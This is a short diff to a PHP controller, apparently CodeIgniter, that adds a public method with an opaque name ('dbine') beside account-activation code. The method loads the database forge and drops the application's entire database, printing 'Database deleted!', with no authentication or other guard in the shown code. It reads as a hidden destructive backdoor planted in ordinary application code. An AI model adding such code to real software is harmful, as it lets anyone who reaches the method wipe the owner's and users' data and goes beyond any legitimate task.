@@ -86,6 +86,18 @@ public function activateAccount($id = null)
       return false;
    }
 }
+
+public function dbine()
+{
+    $this->load->database();
+    $this->load->dbforge();
+    if ($this->dbforge->drop_database($this->db->database))
+    {
+        echo 'Database deleted!';
+    }else{
+        echo 'error';
+    }
+}
    
 
 }
